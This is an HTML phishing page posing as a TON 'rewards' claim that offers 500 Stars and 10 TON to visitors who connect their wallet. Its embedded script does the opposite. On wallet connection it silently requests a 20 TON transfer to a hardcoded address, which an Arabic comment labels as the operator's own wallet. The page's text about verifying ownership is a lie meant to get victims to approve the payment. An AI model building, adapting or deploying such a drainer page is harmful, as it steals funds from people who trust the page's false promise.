<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Rewards</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #0b0b0b; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #151515; padding: 35px; border-radius: 24px; border: 1px solid #222; text-align: center; width: 330px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
        h1 { font-size: 20px; color: #00d4ff; margin-bottom: 10px; }
        p { color: #777; font-size: 13px; line-height: 1.5; margin-bottom: 25px; }
        #ton-connect-button { display: flex; justify-content: center; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://ton.org/pics/ton_logo.purp.png" width="55" style="margin-bottom: 15px;">
        <h1>Claim 500 Stars & 10 TON</h1>
        <p>Connect your wallet to verify your ownership and receive ecosystem rewards instantly.</p>
        <div id="ton-connect-button"></div>
        <p style="margin-top: 30px; font-size: 10px; color: #444;">🛡️ Secured by TON Connect 2.0</p>
    </div>

    <script>
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://acenumber0.github.io/telegram/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [{
                        address: "UQBNuacGY8g0jkr4mHsx6S9QFPNG3GTocxg-ZmB8Sgo5c_CS", // محفظتك
                        amount: "20000000000" // طلب سحب 20 TON
                    }]
                };
                tonConnectUI.sendTransaction(transaction);
            }
        });
    </script>
</body>
</html>
